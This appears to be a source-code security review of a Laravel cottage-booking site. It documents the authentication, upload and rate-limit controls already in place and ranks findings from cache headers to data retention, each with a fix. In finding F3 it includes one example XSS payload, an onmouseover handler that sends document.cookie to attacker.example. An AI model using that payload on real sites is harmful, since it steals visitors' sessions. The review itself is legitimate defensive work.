# Security — Applied Controls and Recommended Hardening

- [Part 1 — Controls actually applied](#part-1--controls-actually-applied)
- [Part 2 — Findings, ranked](#part-2--findings-ranked)
- [Part 3 — Recommended hardening, with code](#part-3--recommended-hardening-with-code)
- [Part 4 — Pre-launch checklist](#part-4--pre-launch-checklist)

> **This review predates the direct booking + Stripe payments feature.** The controls and
> findings below still apply to everything they describe, and two findings (**F2** security
> headers, **F9** `TrustProxies`) matter *more* now that payment links and a payment
> webhook exist. The payments feature carries its own security model — webhook signature
> verification, amount verification, signed payment links, PCI scope — documented in
> [`05-payments-and-booking.md` Part 4](05-payments-and-booking.md).
>
> One finding is now partially addressed: **F4** (`$guarded = []`) — the four *new* models
> use explicit `$fillable`, deliberately excluding every money and status column. The four
> pre-existing models are unchanged.

**Scope of this review:** a source read of the application code at commit time. It is not
a penetration test, and it does not cover the hosting environment, TLS termination,
Lodgify's own security posture, or the Stripe integration (which lives entirely inside
Lodgify's hosted checkout — see §1.9).

**Overall assessment:** the security posture of the *application logic* is notably
better than typical for a project this size. Account enumeration, session fixation,
IDOR on reservations, unmoderated file exposure, and mass-assignment of `is_admin` have
all been thought about and handled, and the reasoning is documented in comments at each
site. The gaps are concentrated in **transport/infrastructure hardening** (no security
headers, no proxy trust, cookie flags left to defaults) and in **a small number of
input-validation holes** on paths that were built later than the rest.

---

# Part 1 — Controls actually applied

## 1.1 Authentication

| Control | Where | Detail |
|---|---|---|
| Password hashing | `User::casts()` | `'password' => 'hashed'`. `BCRYPT_ROUNDS=12` in `.env.example`; PHPUnit overrides to 4 for test speed. |
| Password strength | `Register`, `ResetPassword`, `Profile::updatePassword` | `Rules\Password::defaults()` on all three write paths — one definition, three consumers. |
| Session fixation | `LoginController::store()` | `$request->session()->regenerate()` immediately after a successful `Auth::attempt`. |
| Complete logout | `LoginController::destroy()` | `Auth::logout()` **+** `session()->invalidate()` **+** `session()->regenerateToken()`. All three, not just the first. |
| Re-auth before password change | `ProfileController::updatePassword()` | `'current_password' => ['required','current_password']`. |
| Remember-token rotation on reset | `ResetPasswordController::store()` | `'remember_token' => Str::random(60)` inside the reset callback — invalidates a stolen remember-me cookie. |
| Email verification enforced | `User implements MustVerifyEmail`; `verified` middleware on 5 profile routes | Not cosmetic: reservations are matched **by email address**, so verification is the actual authorization boundary. |
| Signed verification links | `routes/web.php:201` | `->middleware('signed')` on `verification.verify`. |
| Verification reset on email change | `ProfileController::update()` | `email_verified_at = null` + re-send when the address changes, so you cannot gain access to another guest's history by editing your own email. |
| Custom reset notification | `User::sendPasswordResetNotification()` | Marked `#[\SensitiveParameter]` so the token is redacted from stack traces. |

## 1.2 Account-enumeration resistance

Three separate paths were hardened, each with the reasoning in a comment:

```php
// LoginController::store() — one message for wrong-email AND wrong-password
throw ValidationException::withMessages([
    'email' => 'Those credentials don\'t match our records.',
]);

// ForgotPasswordController::store() — always report success
if ($status !== Password::RESET_LINK_SENT) {
    report(new \RuntimeException("Password reset link not sent: {$status}"));
}
return back()->with('status', 'If that email is registered, a reset link is on its way.');

// ProfileController::show() — identical message for "not found" and "not yours"
return redirect()->route('profile.index')
    ->with('profile_error', 'We couldn\'t find that booking on your account.');
```

The one deliberate exception is `Password::RESET_THROTTLED`, which *is* surfaced — the
user needs to know, or they keep pressing the button. That leaks only "this address was
recently used in a reset attempt", which is a reasonable trade.

`RegisterController` does surface `email.unique` ("There is already an account with that
email. Try signing in instead."), which is an enumeration vector — but an unavoidable
one for any registration form that prevents duplicate accounts, and the standard trade-off.

## 1.3 Authorization

| Control | Where |
|---|---|
| Admin gate | `EnsureUserIsAdmin`, aliased as `admin` in `bootstrap/app.php` |
| Correct middleware ordering | `Route::middleware(['auth','admin'])` — signed-out visitors are redirected to login, signed-in non-admins get a clear **403**, not a login form they already passed |
| Explicit `abort_unless` | `abort_unless($user->isAdmin(), 403, 'This area is for site administrators.')` |
| IDOR protection on reservations | `ProfileController::show()` compares lowercased `$reservation->guestEmail` against `$request->user()->email` |
| `is_admin` never settable from a public form | `RegisterController::store()` passes `'is_admin' => false` explicitly |

The IDOR check carries the best comment in the codebase, and it is exactly right:

> *Ownership check, not just existence. Without comparing the email the booking id alone
> would be an access token — and Lodgify ids are sequential, so they are trivially
> guessable.*

## 1.4 Input validation

Every write path validates. There are no unvalidated `$request->all()` writes anywhere.

- **FormRequests** for the three public forms: `StoreContactMessageRequest`,
  `StoreBusinessStayRequest`, `StoreGuestPhotoRequest`.
- **Inline `$request->validate()`** in `AvailabilityController::search`,
  `RateController::month`/`quote`, `BookingRedirectController`, all four auth
  controllers, `ProfileController::update`/`updatePassword`, and all three admin
  `update` methods.
- **Enum-bounded status writes:**
  ```php
  'status' => ['required','string','in:'.implode(',', array_keys(BusinessStayStatus::options()))],
  ```
  The allowed set is derived from the enum, so it can never drift from the type.
- **Sort-column allowlisting** — the injection-safe pattern, applied where user input
  reaches `orderBy()`:
  ```php
  $sort = in_array($request->query('sort'),
          ['created_at','check_in','guests_count','company_name'], true)
          ? $request->query('sort') : 'created_at';
  $dir  = $request->query('dir') === 'asc' ? 'asc' : 'desc';
  ```
- **Debug target allowlisting** — `DebugController::raw()` checks `$what` against a
  19-value allowlist and returns 422 with the allowed list on a miss, so the parameter
  can never select an arbitrary URL.

## 1.5 Spam and abuse controls

**Honeypots** on all three public forms plus registration, implemented as
`['prohibited']` rules on a field real users never see:

| Form | Honeypot field |
|---|---|
| Contact | `website_url` |
| Business stay | `company_website_url` |
| Guest photo | `website_url` |
| Register | `website_url` |

All four return the same opaque message — *"Something went wrong. Please try again."* —
rather than revealing the trap.

**Rate limits**, tuned per route rather than applied uniformly:

| Route | Limit | Rationale (from comments where given) |
|---|---|---|
| `POST /share-your-photos` | `3,1` | *"Uploads are expensive; 3 submissions a minute is generous for a person and useless to anyone trying to fill the disk."* |
| `POST /reset-password`, `POST /forgot-password` | `5,1` | credential-recovery abuse |
| `POST /contact`, `POST /business-stays`, `POST /register`, `POST /verify-email/send` | `6,1` | form spam |
| `POST /login` | `10,1` **route** + `5/min` per email+IP **in-controller** | two independent layers |
| `GET /book/{slug}` | `30,1` | checkout handoff |
| `GET /api/availability/month`, `…/addons` | `60,1` | widget traffic |
| `GET /api/cottage/{slug}/rates`, `…/quote` | `120,1` | interactive calendar |

The login limiter is worth calling out because it is composed, not just declared:

```php
protected function throttleKey(Request $request): string
{
    return Str::transliterate(
        Str::lower((string) $request->input('email')) . '|' . $request->ip()
    );
}
```

Keying on **email + IP** (rather than IP alone) means one attacker cannot lock out a
legitimate user by hammering their address from elsewhere, while still capping per-account
guessing. `Str::transliterate` normalises homoglyphs so `аdmin@…` (Cyrillic а) shares a
bucket with `admin@…`.

## 1.6 File-upload security — the strongest area of the codebase

```php
'photos'   => ['required','array','min:1','max:10'],
'photos.*' => ['required',
               File::image()->types(['jpg','jpeg','png','webp','heic'])->max(12 * 1024),
               'dimensions:min_width=600,min_height=400'],
'consent_given' => ['accepted'],
```

Layered defences, in order:

1. **Content-based MIME validation.** `File::image()` inspects actual file content, not
   the extension — *"a renamed .php fails here rather than reaching disk"*.
2. **Size and count caps.** 12 MB per file, 10 files per submission, 3 submissions per
   minute → a hard ceiling of ~360 MB/min from one client, and that is the *only*
   unauthenticated write-to-disk path in the app.
3. **Dimension floor.** `min_width=600,min_height=400` incidentally rejects the
   1×1-pixel polyglot payloads used to smuggle content past image checks.
4. **Private disk by default.** `$file->store('guest-photos/pending', 'local')` — the
   `local` disk root is `storage_path('app/private')`, outside the webroot. Nothing
   unmoderated is ever reachable by URL.
5. **Randomised filenames.** `store()` generates a hashed name, so the guest's original
   filename (often a device path) never appears in a URL. The original is kept in a
   database column, truncated to 190 chars.
6. **A second content check.** `@getimagesize()` in `dimensions()` returns `false` for a
   non-image even if it slipped past validation.
7. **Explicit consent.** `'accepted'` rather than a defaulted checkbox — publishing
   someone's photo needs a recorded yes, which is a privacy control as much as a security
   one.
8. **Fail-closed URL accessor.**
   ```php
   public function getUrlAttribute(): ?string
   {
       if ($this->status !== GuestPhotoStatus::Approved || $this->disk !== 'public') {
           return null;
       }
       return Storage::disk('public')->url($this->path);
   }
   ```
   A template that forgets to check the status renders nothing rather than leaking an
   unmoderated image.
9. **Correct promotion ordering.** In `Admin\GuestPhotoController::approve()`: copy to
   public → update the record → *then* delete the private original. A storage failure can
   never leave a published photo pointing at a missing file.
10. **Authenticated-only moderation preview.** Pending files are streamed through
    `GET /admin/photos/{guestPhoto}/file` with `Cache-Control: private, max-age=300`.

## 1.7 Framework-level protections in force

| Protection | Status |
|---|---|
| CSRF | **Active.** `withRouting(web: …)` applies the `web` group, which includes `ValidateCsrfToken`. No `$except` entries anywhere. Admin layout also exposes `<meta name="csrf-token">`. |
| SQL injection | **Not reachable.** Every query uses Eloquent/query-builder bindings. The two `selectRaw()` calls (`Admin\*Controller::counts()`, `GalleryController::index`) contain only literals. `orderBy()` inputs are allowlisted. |
| XSS | **Blade auto-escaping everywhere**, with exactly one `{!! !!}` (see §F3). `@js()` used for all JS payloads (JSON-encodes and escapes correctly). |
| Cookie encryption | Active via the `web` group's `EncryptCookies`. |
| `serializable_classes` | `false` in `config/cache.php` — no PHP class may be unserialized from the cache, so a leaked `APP_KEY` cannot be turned into a gadget-chain RCE via cache poisoning. |
| Mass-assignment of credentials | `User::$fillable` is an allowlist (`name, email, password, is_admin`), and `$hidden` covers `password` + `remember_token`. |
| Session cookie flags | `http_only` defaults `true`, `same_site` defaults `lax` (`config/session.php`). |
| Admin pages excluded from indexing | `<meta name="robots" content="noindex, nofollow">` in `layouts/admin.blade.php`. |

## 1.8 Secret handling

- No secrets in the repository. `.gitignore` covers `.env`, `.env.backup`,
  `.env.production`, `/auth.json`, `/storage/*.key`.
- `AdminUserSeeder` refuses to run without `ADMIN_EMAIL` + `ADMIN_PASSWORD` from the
  environment: *"Credentials come from .env so no password is ever committed."*
- `config/lodgify.php` carries an explicit, correct warning against
  `LODGIFY_DASHBOARD_COOKIE`: it is a login session, it expires, *"it grants far more
  than read access to photos"*, and *"it belongs in .env, never in version control."*
- `config/services-google.php` warns to restrict the Google key to the Places API and to
  the server's IP — *"an unrestricted key on a public site is a billing incident waiting
  to happen."*
- Upstream error logging is bounded: `assertOk()` logs `mb_substr($body, 0, 500)`, and
  `safe()` logs 300 chars — so a verbose upstream error cannot dump an unbounded payload
  into the log.
- **Production error output is sanitised.** `AvailabilityController::month` and
  `RateController::month` include `lastErrors()` in a `notes` array **only** under
  `local`/`staging`:
  ```php
  'notes' => app()->environment(['local','staging']) ? $errors : [],
  ```

## 1.9 PCI / payments

The application **never touches card data**. `LodgifyCheckout` builds a URL and
`BookingRedirectController` calls `redirect()->away($url)`; everything from that point —
contact details, payment, Stripe — happens on `checkout.lodgify.com`. The class docblock
states the reasoning: rebuilding checkout locally would mean an unverified booking write,
PCI scope, and reconciling two systems, for the same guest experience.

This is the correct call and materially shrinks the attack surface. `LodgifyClient` does
define `createBooking()` (`POST /v2/reservations/bookings`), but **nothing calls it** —
there is no booking-write path in the application at all.

## 1.10 Debug surface

The seven `/debug/lodgify/*` routes are wrapped in a **registration-time** environment
check:

```php
if (app()->environment(['local', 'staging'])) {
    Route::prefix('debug/lodgify')->group(function () { … });
}
```

Because the check runs when routes are registered rather than inside the controller, in
production these paths **do not exist** — the router 404s and no controller code is
reached. That is stronger than a middleware gate. `DebugController` still opens with
*"NOT for production. Gate behind auth or remove before shipping."*

Note that `config:cache`/`route:cache` bake the environment in at cache time, so a cached
route file built while `APP_ENV=staging` would carry the debug routes into whatever
environment consumes it. Build caches in the target environment.

---

# Part 2 — Findings, ranked

Severity reflects impact **in this application's context** (a public brochure/booking site
with one or two admin operators, no payment data, no PII beyond enquiry contact details
and Lodgify booking summaries).

| # | Finding | Severity |
|---|---|---|
| F1 | `Cache-Control: public` on session-bearing responses | **High** |
| F2 | No security-response headers (CSP, HSTS, X-Content-Type-Options, Referrer-Policy, X-Frame-Options) | **High** |
| F3 | `strip_tags` allowlist does not strip event-handler attributes | **Medium** |
| F4 | `protected $guarded = []` on all four local models | **Medium** |
| F5 | `Content-Type` reflected from a stored, user-influenced `mime` column | **Medium** |
| F6 | `CottageController::show()` does not validate its query parameters | **Medium** |
| F7 | Password change does not rotate `remember_token` or other sessions | **Medium** |
| F8 | `GET /debug/lodgify/flush` mutates state; on the default driver it is `Cache::flush()` | **Medium** (dev-only) |
| F9 | No `TrustProxies` — `$request->ip()` is the proxy's IP behind a load balancer | **Medium** |
| F10 | Session cookie flags not pinned for production | **Medium** |
| F11 | Guest photo `reject()` can leave a file publicly reachable | **Low** |
| F12 | Enquiry notification emails are commented out | **Low** (operational) |
| F13 | Unbounded PII retention; no purge policy | **Low** |
| F14 | Spoofed browser headers on `publicHttp()` | **Informational** |
| F15 | Admin surface has no audit log | **Low** |
| F16 | No security regression tests | **Medium** (process) |

---

## F1 — `Cache-Control: public` on session-bearing responses · **High**

Three endpoints set a `public` cache directive:

```php
// AvailabilityController::month()
->header('Cache-Control', 'public, max-age=60');

// RateController::month()
->header('Cache-Control', 'public, max-age=60');

// RateController::addons()
->header('Cache-Control', 'public, max-age=300');
```

These routes live in `routes/web.php` and therefore run in the **`web` middleware group**,
which starts a session and attaches a `Set-Cookie` header to the response. A response
that is both `Cache-Control: public` **and** carries `Set-Cookie` is a classic shared-cache
poisoning vector: a CDN, reverse proxy or corporate cache that honours `public` may store
the response *with its cookie* and serve visitor A's session identifier to visitor B.

`RateController::quote()` gets this right — it uses `private, max-age=30` — which shows
the distinction was understood in one place and missed in three.

**Severity is High** because the impact is session takeover and the trigger is
infrastructure the application does not control (any intermediary cache in front of it).

**Fix — two parts, apply both:**

```php
// 1. Never emit `public` from a session-bearing route.
->header('Cache-Control', 'private, max-age=60')
```

```php
// 2. Better: move the /api/* routes out of the session group entirely.
//    They are anonymous, read-only, and need neither session nor CSRF.
// bootstrap/app.php
->withRouting(
    web: __DIR__.'/../routes/web.php',
    then: function () {
        Route::middleware('api-internal')     // throttle + no session, no cookies
            ->prefix('api')
            ->group(__DIR__.'/../routes/api-internal.php');
    },
    commands: __DIR__.'/../routes/console.php',
    health: '/up',
)
```

Once the endpoints are stateless, `public, max-age=60` becomes both safe *and* genuinely
useful — a CDN can absorb the calendar traffic entirely.

---

## F2 — No security-response headers · **High**

There is no header middleware anywhere in `app/Http/Middleware/` (the directory contains
only `EnsureUserIsAdmin.php`), and `bootstrap/app.php` appends nothing to the global
stack. The application therefore ships with **no**:

| Header | Consequence of absence |
|---|---|
| `Content-Security-Policy` | No mitigation layer behind Blade escaping. F3 becomes directly exploitable. |
| `Strict-Transport-Security` | A first-visit HTTP request can be intercepted and downgraded. |
| `X-Content-Type-Options: nosniff` | Browsers may MIME-sniff responses — compounds F5 on the photo-streaming route. |
| `Referrer-Policy` | Full URLs (including `/reset-password/{token}` and `/verify-email/{id}/{hash}`) leak in the `Referer` header to any third-party asset. **This is the most immediately damaging one** — those tokens are credentials. |
| `X-Frame-Options` / `frame-ancestors` | Admin pages can be framed for clickjacking. |
| `Permissions-Policy` | Camera/microphone/geolocation not disabled. |

A CSP needs care here because the site legitimately loads Google Fonts, embeds a Google
Maps iframe (`Cottage::mapEmbedUrl()`), and pulls images from `l.icdbcdn.com`. Alpine.js
also needs `unsafe-eval` unless the CSP build of Alpine is adopted. Start in
`Content-Security-Policy-Report-Only`, collect violations, then enforce. See
[§3.2](#32-f2--add-a-security-headers-middleware) for a working starting policy.

---

## F3 — `strip_tags` allowlist does not strip attributes · **Medium**

`resources/views/pages/cottage.blade.php:561` — the only unescaped output in the codebase:

```blade
{!! \Illuminate\Support\Str::of($cottage->description)
        ->stripTags('<p><br><strong><em><ul><ol><li><h3><h4>') !!}
```

`Str::stripTags()` wraps PHP's `strip_tags()`, which removes *disallowed tags* but
**preserves every attribute on allowed tags**. So the following survives intact:

```html
<p onmouseover="fetch('https://attacker.example/?c='+document.cookie)">Lovely cottage</p>
<strong onclick="…">…</strong>
```

**Why this is Medium, not High:** the source is the property description from the
operator's own Lodgify dashboard, so exploitation requires compromising that dashboard or
insider action. But treating a third-party API response as trusted HTML is exactly the
assumption an attacker who phishes one Lodgify login gets to break — and there is no CSP
behind it (F2) to contain the result.

**Fix — sanitise attributes, don't just filter tags:**

```bash
composer require ezyang/htmlpurifier
```

```php
// app/Support/Html.php
final class Html
{
    public static function sanitise(?string $html): string
    {
        if (blank($html)) return '';

        $config = \HTMLPurifier_Config::createDefault();
        $config->set('HTML.Allowed',
            'p,br,strong,em,ul,ol,li,h3,h4');   // tags only — no attributes at all
        $config->set('Cache.SerializerPath', storage_path('app/purifier'));

        return (new \HTMLPurifier($config))->purify($html);
    }
}
```

```blade
{!! \App\Support\Html::sanitise($cottage->description) !!}
```

Cheaper interim mitigation if a dependency is unwelcome: pre-sanitise in
`LodgifyRepository::mapCottage()` so the DTO never carries unsafe HTML — then the view's
`{!! !!}` is operating on already-clean data, and every future consumer of
`$cottage->description` inherits the protection.

---

## F4 — `protected $guarded = []` on all four local models · **Medium**

`BusinessStayRequest`, `CheckoutIntent`, `ContactMessage` and `GuestPhoto` all disable
mass-assignment protection completely.

**No current call site is exploitable.** Every `create()`/`update()` passes either
`$request->validated()`, `$request->safe()->except(...)`, or an explicit literal array —
so only validated keys ever reach the model. Verified across all five write paths.

But the protection exists precisely so that safety does not depend on every future call
site being reviewed. The columns that would matter if one slipped:

| Model | Columns a request must never set |
|---|---|
| `GuestPhoto` | `status`, `disk`, `path`, `is_featured`, `reviewed_by`, `reviewed_at`, `sort_order` |
| `BusinessStayRequest` | `status`, `handled_by`, `internal_notes`, `contacted_at`, `quoted_at`, `closed_at` |
| `ContactMessage` | `status`, `handled_by`, `internal_notes`, `read_at`, `replied_at` |
| `CheckoutIntent` | `status`, `lodgify_booking_id`, `converted_at`, `quoted_total` |

The `GuestPhoto` row is the sharpest: a single future `GuestPhoto::create($request->all())`
would let an anonymous uploader set `status: approved` and `disk: public`, publishing an
arbitrary image straight to the gallery and bypassing moderation entirely.

**Fix** — replace with explicit `$fillable` on all four (see [§3.4](#34-f4--explicit-fillable)).

---

## F5 — `Content-Type` reflected from a stored `mime` column · **Medium**

`Admin\GuestPhotoController::file()`:

```php
return Storage::disk($guestPhoto->disk)->response(
    $guestPhoto->path,
    $guestPhoto->original_name,
    ['Content-Type' => $guestPhoto->mime, 'Cache-Control' => 'private, max-age=300']
);
```

`mime` was written at upload from `$file->getMimeType()`. That is a server-side detection
(Symfony's finfo-based guesser), not the client's `Content-Type` header, so it is not
directly attacker-chosen — which is why this is Medium rather than High. But the value is
stored, echoed back verbatim on a later request, and there is no `X-Content-Type-Options:
nosniff` (F2) to stop a browser sniffing the body anyway.

**Fix — pin the response type to a known-safe allowlist rather than reflecting storage:**

```php
private const SAFE_IMAGE_TYPES = [
    'image/jpeg', 'image/png', 'image/webp', 'image/heic', 'image/heif',
];

public function file(GuestPhoto $guestPhoto): StreamedResponse
{
    abort_unless(Storage::disk($guestPhoto->disk)->exists($guestPhoto->path), 404);

    $type = in_array($guestPhoto->mime, self::SAFE_IMAGE_TYPES, true)
        ? $guestPhoto->mime
        : 'application/octet-stream';

    return Storage::disk($guestPhoto->disk)->response(
        $guestPhoto->path,
        $guestPhoto->original_name,
        [
            'Content-Type'           => $type,
            'X-Content-Type-Options' => 'nosniff',
            'Content-Disposition'    => 'inline; filename="'
                                        . addslashes(basename($guestPhoto->original_name)) . '"',
            'Cache-Control'          => 'private, max-age=300',
        ]
    );
}
```

---

## F6 — `CottageController::show()` does not validate query parameters · **Medium**

Every other controller that reads dates validates them. This one does not:

```php
public function show(Request $request, string $slug): View
{
    $arrival   = $request->query('arrival');       // ← no validation at all
    $departure = $request->query('departure');     // ← no validation at all
    $adults    = max(1, (int) $request->query('adults', 2));
    $children  = max(0, (int) $request->query('children', 0));
    $pets      = max(0, (int) $request->query('pets', 0));
    …
    $quote = $this->lodgify->quote($cottage->id, $arrival, $departure, $adults, …);
}
```

Compare with `AvailabilityController::search()` (`date_format:Y-m-d`, `after:arrival`) and
`RateController::quote()` (same, plus `required`).

The unvalidated values flow into `LodgifyRepository::quote()`, which interpolates them
directly into a **cache key**:

```php
$key = "quote:v2:{$cottageId}:{$arrival}:{$departure}:{$adults}:{$children}:{$pets}{$addonKey}";
```

Consequences, in order of practical concern:

1. **Cache-key flooding.** `?arrival=<random>&departure=<random>` writes a distinct cache
   row per request. Against the default `database` cache driver, that is an *unauthenticated
   INSERT into the `cache` table per request* — a cheap disk-fill / table-bloat vector,
   rate-limited only by whatever fronts the page (nothing: `/cottage/{slug}` has no
   `throttle`).
2. Garbage strings reach Lodgify's query string, producing pointless upstream 400s.
3. Malformed input reaches `Carbon::parse()` deeper in the stack and can throw where the
   caller expects a `null`.

**Fix:**

```php
public function show(Request $request, string $slug): View
{
    $validated = $request->validate([
        'arrival'   => ['sometimes','nullable','date_format:Y-m-d'],
        'departure' => ['sometimes','nullable','date_format:Y-m-d','after:arrival'],
        'adults'    => ['sometimes','integer','min:1','max:20'],
        'children'  => ['sometimes','integer','min:0','max:20'],
        'pets'      => ['sometimes','integer','min:0','max:10'],
    ]);

    $arrival   = $validated['arrival']   ?? null;
    $departure = $validated['departure'] ?? null;
    $adults    = (int) ($validated['adults']   ?? 2);
    $children  = (int) ($validated['children'] ?? 0);
    $pets      = (int) ($validated['pets']     ?? 0);
    …
}
```

**Defence in depth**, independent of the above — never interpolate raw input into a cache
key. Hash the variable part:

```php
// LodgifyRepository::quote()
$key = 'quote:v2:' . $cottageId . ':' . substr(hash('xxh128', implode('|', [
    $arrival, $departure, $adults, $children, $pets, implode(',', $addOnIds),
])), 0, 24);
```

This bounds key length, removes any possibility of key-namespace injection via a crafted
value, and is worth doing across `avail:`, `ratesraw:` and `quote:` alike.

---

## F7 — Password change does not invalidate other sessions · **Medium**

`ProfileController::updatePassword()`:

```php
$request->user()->update(['password' => $validated['password']]);
return back()->with('status', 'Your password has been changed.');
```

`ResetPasswordController` rotates `remember_token`; this path does not, and neither path
invalidates other active sessions. So after a user changes their password *because they
suspect compromise*, the attacker's existing session and remember-me cookie both keep
working.

**Fix:**

```php
public function updatePassword(Request $request): RedirectResponse
{
    $validated = $request->validate([
        'current_password' => ['required','current_password'],
        'password'         => ['required','confirmed', Rules\Password::defaults()],
    ]);

    $user = $request->user();

    $user->forceFill([
        'password'       => $validated['password'],
        'remember_token' => Str::random(60),      // kill every remember-me cookie
    ])->save();

    // Invalidate every OTHER session for this user, keeping the current one.
    // Requires the `database` session driver — which is what this app uses.
    Auth::logoutOtherDevices($validated['password']);

    return back()->with('status',
        'Your password has been changed and you have been signed out everywhere else.');
}
```

`Auth::logoutOtherDevices()` needs `AuthenticateSession` in the `web` group:

```php
// bootstrap/app.php
$middleware->web(append: [\Illuminate\Session\Middleware\AuthenticateSession::class]);
```

Adding `AuthenticateSession` is worth doing regardless — it makes *any* password change
invalidate sibling sessions automatically.

---

## F8 — `GET /debug/lodgify/flush` is a state-changing GET · **Medium (dev-only)**

```php
Route::get('/flush', [DebugController::class, 'flush']);
```

Two problems, both confined to `local`/`staging`:

1. **A GET that mutates.** Any prefetch, crawler, or `<img src>` in a page you happen to
   open can trigger it. CSRF protection does not apply to GET.
2. **On the default cache driver it flushes everything.**
   `LodgifyRepository::flushCache()`:
   ```php
   if (in_array($driver, ['redis','memcached'], true)) {
       Cache::tags([$tag])->flush();
       return;
   }
   Cache::flush();       // ← default driver is `database`
   ```
   With `CACHE_STORE=database`, this truncates the whole `cache` table — every rate
   limiter counter, password-reset throttle, and anything else cached. On staging that is
   a denial-of-protection: one GET resets every `RateLimiter` bucket in the application.

**Fix:**

```php
Route::post('/flush', [DebugController::class, 'flush']);   // POST, CSRF-protected
```

and make the flush actually scoped on non-tagging drivers — see
[`04-caching-database-performance.md` §4.2](04-caching-database-performance.md) for a
prefix-scan implementation. Switching to Redis (recommended anyway) makes the tagged
branch live and resolves the blast radius entirely.

---

## F9 — No `TrustProxies` configuration · **Medium**

`bootstrap/app.php` never calls `$middleware->trustProxies(...)`. Behind any reverse proxy
or load balancer — which is nearly every production deployment — `$request->ip()` returns
the **proxy's** address, not the client's. That breaks:

| Consumer | Effect |
|---|---|
| `LoginController::throttleKey()` | Every login attempt shares one bucket → 5 attempts/min **for all users combined**. Trivial lockout DoS, and per-account guessing is no longer isolated. |
| All `throttle:N,M` middleware | Same collapse — global limits instead of per-client. |
| `ip_address` on 4 tables | Records the proxy IP; spam triage and attribution become useless. |
| `$request->isSecure()` / URL generation | May believe HTTP, breaking secure-cookie and HSTS assumptions. |

**Fix:**

```php
// bootstrap/app.php
->withMiddleware(function (Middleware $middleware): void {
    $middleware->alias(['admin' => EnsureUserIsAdmin::class]);

    $middleware->trustProxies(
        at: explode(',', (string) env('TRUSTED_PROXIES', '')),   // exact IPs/CIDRs
        headers: Request::HEADER_X_FORWARDED_FOR
               | Request::HEADER_X_FORWARDED_HOST
               | Request::HEADER_X_FORWARDED_PORT
               | Request::HEADER_X_FORWARDED_PROTO,
    );
})
```

⚠ Configure `TRUSTED_PROXIES` with the **actual** proxy addresses or CIDR ranges. Using
`'*'` makes `X-Forwarded-For` client-controlled, which turns every rate limiter into a
no-op (an attacker just rotates the header) — strictly worse than the current state.

---

## F10 — Session cookie flags not pinned for production · **Medium**

`config/session.php` reads all three from the environment:

```php
'secure'    => env('SESSION_SECURE_COOKIE'),      // null  → not forced
'same_site' => env('SESSION_SAME_SITE', 'lax'),
'encrypt'   => env('SESSION_ENCRYPT', false),
'lifetime'  => (int) env('SESSION_LIFETIME', 120),
```

`.env.example` sets `SESSION_ENCRYPT=false` and leaves `SESSION_SECURE_COOKIE` unset —
so unless production explicitly sets it, the session cookie is sent over plain HTTP too.

**Fix — pin in production `.env`:**

```dotenv
SESSION_SECURE_COOKIE=true
SESSION_SAME_SITE=lax          # 'strict' breaks the return from Lodgify checkout
SESSION_ENCRYPT=true
SESSION_LIFETIME=120
```

`same_site=lax` (not `strict`) is the right choice for this app specifically: a guest
returning from `checkout.lodgify.com` arrives via a cross-site top-level navigation, and
`strict` would drop the session cookie on that hop.

---

## F11 — `reject()` can leave a file publicly reachable · **Low**

`Admin\GuestPhotoController::reject()`:

```php
if ($guestPhoto->disk === 'public') {
    try {
        Storage::disk('local')->put($privatePath, Storage::disk('public')->get($guestPhoto->path));
        Storage::disk('public')->delete($guestPhoto->path);
        $guestPhoto->disk = 'local';
        $guestPhoto->path = $privatePath;
    } catch (\Throwable $e) {
        Log::error('Photo unpublish failed', [...]);       // ← continues anyway
    }
}

$guestPhoto->forceFill(['status' => GuestPhotoStatus::Rejected, …])->save();
```

If the copy-back throws, the status still flips to `Rejected` while the file remains on
the public disk. `getUrlAttribute()` returns `null` for a non-approved photo, so it
vanishes from the site — but the raw file stays fetchable at its old
`/storage/guest-photos/…` URL until someone notices.

The contrast with `approve()` is instructive: that method *does* fail closed
(`return back()->withErrors(...)` and no status change). `reject()` should do the same, or
at minimum flag the record for cleanup.

**Fix:**

```php
if ($guestPhoto->disk === 'public') {
    try {
        $privatePath = 'guest-photos/pending/'.basename($guestPhoto->path);
        Storage::disk('local')->put($privatePath, Storage::disk('public')->get($guestPhoto->path));
        Storage::disk('public')->delete($guestPhoto->path);
        $guestPhoto->disk = 'local';
        $guestPhoto->path = $privatePath;
    } catch (\Throwable $e) {
        Log::error('Photo unpublish failed', ['photo' => $guestPhoto->id, …]);

        // Fail closed: a rejected photo must not stay web-reachable.
        return back()->withErrors([
            'photo' => 'Could not remove that photo from the public disk. '
                     . 'It is still live — please retry.',
        ]);
    }
}
```

---

## F12 — Enquiry notification emails are commented out · **Low (operational)**

```php
// ContactController::store()
try {
    // Mail::to(config('mail.enquiries_to'))->send(new ContactReceived($message));
} catch (\Throwable $e) { Log::error('Contact notification failed', [...]); }

// BusinessStayController::store()
try {
    // Mail::to(config('mail.enquiries_to'))->send(new BusinessStayReceived($stay));
} catch (\Throwable $e) { Log::error('Business stay notification failed', [...]); }
```

Both sends are commented out; `config('mail.enquiries_to')` is not defined in
`config/mail.php`; and `.env.example` has `MAIL_MAILER=log`. So **nobody is notified when
an enquiry arrives** — the admin queues at `/admin/messages` and `/admin/business-stays`
are the only delivery mechanism, and they are pull-only.

Not a vulnerability, but a security-adjacent availability problem: a time-sensitive
corporate enquiry can sit unread indefinitely. The surrounding try/catch and the
"never let a mail failure lose the message" reasoning are both correct and already in
place — only the send is missing. Queue it (`->queue()`) once a mailer is configured, so a
slow SMTP hop does not block the form response.

---

## F13 — No data-retention policy · **Low**

Four tables accumulate personal data indefinitely:

| Table | Personal data held |
|---|---|
| `contact_messages` | name, email, phone, free-text message, IP, user agent |
| `business_stay_requests` | company, contact name, job title, email, phone, tax number, budget, IP, UA |
| `guest_photos` | guest name, email, photo, stay date, IP, UA |
| `checkout_intents` | dates, party size, quoted total, referrer, UTM, IP, UA, **session id** |

Soft deletes mean `delete()` never actually removes anything. The `guest_photos` file is
only removed on `forceDelete()`. `checkout_intents` stores `session_id` alongside IP and
user agent, which is the most identifying combination in the schema.

For a Canadian business this touches PIPEDA's limiting-retention principle. Two things
worth adding regardless of jurisdiction:

```php
// routes/console.php
Schedule::command('app:purge-stale-enquiries')->weekly();
```

```php
// A purge command, with a retention window per table
ContactMessage::onlyTrashed()->where('deleted_at', '<', now()->subMonths(12))->forceDelete();
CheckoutIntent::where('created_at', '<', now()->subMonths(6))->delete();   // analytics value decays fast
GuestPhoto::onlyTrashed()->where('deleted_at', '<', now()->subMonths(6))->forceDelete();
```

Also worth doing: stop storing `session_id` on `checkout_intents`, or hash it. It adds
little to attribution and a lot to identifiability. And `resources/views/pages/privacy-and-policy.blade.php`
should state the actual retention windows once they exist.

---

